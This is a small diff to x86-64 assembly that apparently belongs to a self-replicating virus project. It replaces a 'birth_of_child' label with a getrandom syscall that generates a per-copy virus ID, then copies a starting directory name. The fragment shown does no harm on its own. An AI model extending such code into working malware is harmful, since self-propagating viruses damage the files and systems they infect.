@@ -70,7 +70,12 @@ encrypted_start:
     cmp rax, 0
     jnz exit
 
-birth_of_child:
+    lea rdi, [rsp + virusId]
+    mov rsi, 8
+    mov rdx, GRND_RANDOM
+    mov rax, SYS_GETRANDOM
+    syscall
+
     lea rdi, [rsp + fileName]
     lea rsi, [rel firstDir]
     call ft_strcpy
